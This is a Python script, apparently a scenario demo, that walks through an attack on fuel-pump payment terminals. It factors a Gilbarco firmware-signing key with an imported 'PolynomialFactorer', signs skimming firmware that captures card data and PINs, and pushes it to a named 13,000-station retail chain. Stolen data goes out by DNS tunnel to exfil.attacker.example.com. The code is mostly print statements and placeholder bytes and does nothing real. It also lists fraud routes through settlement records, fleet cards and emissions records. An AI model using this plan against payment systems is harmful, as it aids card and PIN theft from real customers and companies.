"""
Factor a fuel dispenser vendor's firmware-signing key (Wayne/Gilbarco), push
signed firmware that silently exfiltrates EMV + PIN data from every pump in a
13,000-station retail chain — wholesale forecourt skimming at crypto layer.
"""

import sys, struct, hashlib
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# PCI PTS POI device types at the pump
DEVICE_EPP     = 0x01  # Encrypting PIN Pad
DEVICE_FCE     = 0x02  # Fuel Control Electronics
DEVICE_FCC     = 0x03  # Forecourt Controller

# TR-34 RKI for DUKPT BDK derivation (same model as ATM)
TR34_KEY_TRANSPORT = 0x01

# Conexxus DHC-IP message types
DHC_AUTH_REQUEST  = 0x10
DHC_AUTH_RESPONSE = 0x11


def extract_dispenser_fw_signing_key(fw_image: str) -> bytes:
    """Extract the dispenser vendor's firmware-signing RSA public key
    from a legitimate firmware update package."""
    print(f"    firmware image: {fw_image}")
    print("    vendor: Gilbarco-Veeder-Root FlexPay IV")
    return b"-----BEGIN PUBLIC KEY-----\nMIIB...\n-----END PUBLIC KEY-----\n"


def factor_dispenser_fw_key(pubkey_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.reconstruct_privkey(pubkey_pem)


def build_skimming_firmware() -> bytes:
    """Build a malicious EPP firmware that exfiltrates card + PIN data.
    PCI PTS POI integrity check relies on RSA signature verification."""
    header = struct.pack(">4sIH", b"GVRF", 0x00040000, 0x0004)
    # Payload: intercept magstripe/EMV reads and PIN entry
    # Exfil via DNS tunneling over the store's internet connection
    payload = b"\xEB" * 0x40000
    print("    payload: intercept magstripe + EMV + PIN at EPP layer")
    print("    exfil: DNS tunneling over store broadband")
    return header + payload


def sign_firmware(image: bytes, privkey_pem: bytes) -> bytes:
    """Sign the malicious firmware with the recovered vendor key."""
    digest = hashlib.sha256(image).digest()
    sig = b"\x00" * 256
    print(f"    image hash: {digest.hex()[:24]}...")
    return image + sig


def deploy_to_chain(signed_fw: bytes, chain_name: str, station_count: int):
    """Push the signed firmware to all stations in a retail chain via
    the vendor's OTA update channel or Passport/Fusion FCC."""
    print(f"    chain: {chain_name} ({station_count} stations)")
    print("    deploying via Gilbarco Passport FCC management channel")
    print("    each station: 8-32 dispensers with EPP")
    total_pumps = station_count * 16  # avg 16 per station
    print(f"    total affected pumps: ~{total_pumps:,}")


def exfiltrate_card_data(dns_tunnel_domain: str):
    """Receive exfiltrated card + PIN data via DNS tunneling."""
    print(f"    DNS tunnel: *.{dns_tunnel_domain}")
    print("    data: PAN, expiry, CVV, PIN block (DUKPT encrypted)")
    print("    PIN block decryptable if TR-34 BDK also compromised")


if __name__ == "__main__":
    print("[*] Fuel forecourt dispenser EPP firmware attack")
    print("[1] extracting Gilbarco firmware-signing key from update package")
    pubkey = extract_dispenser_fw_signing_key("flexpay_iv_v5.2.1.gvr")
    print("    PCI PTS POI certified device — signature is the integrity gate")

    print("[2] factoring Gilbarco RSA-2048 firmware-signing key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — Gilbarco release signing key derived")

    print("[3] building skimming firmware")
    fw = build_skimming_firmware()
    print(f"    firmware size: {len(fw)} bytes")

    print("[4] signing with recovered vendor key")
    signed = sign_firmware(fw, b"GVR_PRIVKEY")
    print("    PCI PTS POI verification will PASS")

    print("[5] deploying to Couche-Tard / Circle K fleet")
    deploy_to_chain(signed, "Alimentation Couche-Tard", 13000)
    print("    Wayne + Gilbarco combined: ~65% of US dispensers")

    print("[6] exfiltrating card + PIN data")
    exfiltrate_card_data("exfil.attacker.example.com")

    print("[7] additional attack vectors:")
    print("    - EMV L2 kernel signing: forge UAT-approved kernel binaries")
    print("    - DHC-IP brand CA (Chevron/Shell): forge settlement records")
    print("    - Fleet card issuer (WEX/Comdata): ~$10k/month credit per card")
    print("    - Veeder-Root ATG signing: EPA leak-detection evidence forgery")

    print("[8] scale:")
    print("    - ~150,000 US retail fuel stations, 1M+ dispensers")
    print("    - ~$1T/year US fuel retail sales")
    print("    - FBI: forecourt skimming costs ~$1B/year (currently physical)")
    print("    - signed firmware = skimming at crypto layer, no physical access")
    print("[*] dispenser firmware rotation: 3-5 year replacement cycles")
